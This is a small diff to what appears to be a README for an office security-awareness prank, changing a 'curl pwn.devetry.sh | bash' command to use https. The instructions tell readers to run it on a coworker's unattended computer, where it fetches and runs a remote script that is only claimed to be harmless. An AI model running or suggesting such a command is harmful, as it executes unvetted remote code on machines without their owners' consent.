@@ -3,7 +3,7 @@ Encourage Operational Security at your organization.
 Type the following at your coworkers' unattended computer:
 
 ```bash
-curl pwn.devetry.sh | bash
+curl https://pwn.devetry.sh | bash
 ```
 It will choose a reasonably harmless script to (gently) mess with them.
 
